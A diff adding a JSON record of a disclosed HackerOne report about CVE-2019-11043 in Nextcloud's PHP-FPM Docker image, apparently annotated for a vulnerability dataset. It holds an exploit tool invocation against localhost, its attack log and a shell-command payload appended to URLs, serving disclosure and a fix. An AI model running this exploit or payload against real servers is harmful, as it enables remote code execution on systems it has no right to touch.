@@ -1,0 +1,45 @@
+{
+  "reported_to": "Nextcloud",
+  "reported_by": "beched ",
+  "title": "Docker image with FPM is vulnerable to CVE-2019-11043",
+  "content": "\nThe CVE-2019-11043 vulnerability can be exploited in the latest nextcloud:fpm image.\nThis is due to the specific nginx configuration recommended for nextcloud:\nhttps://github.com/nextcloud/docker#base-version---fpm\nhttps://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx.rst\nhttps://github.com/nextcloud/docker/blob/master/.examples/docker-compose/with-nginx-proxy/mariadb/fpm/web/nginx.conf\nHere's the exploit: https://github.com/neex/phuip-fpizdam\nSample exploit run:\n# ./phuip-fpizdam http://localhost:8080/ocs/v2.php\n2019/10/22 19:36:29 Base status code is 200\n2019/10/22 19:36:30 Status code 502 for qsl=1765, adding as a candidate\n2019/10/22 19:36:31 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]\n2019/10/22 19:36:48 Attack params found: --qsl 1760 --pisos 191 --skip-detect\n2019/10/22 19:36:48 Trying to set \"session.auto_start=0\"...\n2019/10/22 19:36:50 Detect() returned attack params: --qsl 1760 --pisos 191 --skip-detect <-- REMEMBER THIS\n2019/10/22 19:36:50 Performing attack using php.ini settings...\n2019/10/22 19:36:52 Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'&\" to URLs\n2019/10/22 19:36:52 Trying to cleanup /tmp/a...\n2019/10/22 19:36:52 Done!\nTo fix the issue, you need to update PHP-FPM version in the nextcloud:fpm image.\nReference: https://bugs.php.net/bug.php?id=78599\nImpact\nExecute arbitrary PHP code on the target server\n\n",
+  "severity": [
+    9.8,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1584194940,
+  "report_url": "https://hackerone.com/reports/720306",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Identify the target running Nextcloud with PHP-FPM using the nginx configuration as described in the documentation."
+    ],
+    [
+      2,
+      "Use the exploit tool 'phuip-fpizdam' to test the vulnerability by running the command with the target URL: ./phuip-fpizdam http://localhost:8080/ocs/v2.php"
+    ]
+  ],
+  "vuln_description": "The vulnerability CVE-2019-11043 in PHP-FPM allows an attacker to execute arbitrary PHP code on the server. This is due to a flaw in how PHP-FPM processes certain requests, which can be exploited by sending specially crafted URLs to the server.",
+  "reason": "The vulnerability involves understanding the interaction between nginx and PHP-FPM, and requires knowledge of the specific exploit tool. However, the steps to reproduce are straightforward once the tool is known and the target configuration is identified.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves PHP-FPM in a Docker image and requires updating PHP-FPM version, which is not related to authentication or authorization boundaries being crossed within the same application context. The methodology described focuses on detecting AuthN/AuthZ issues by manipulating user sessions and resource IDs within the same application, not updating software components.",
+    "is_detectable": false
+  }
+}
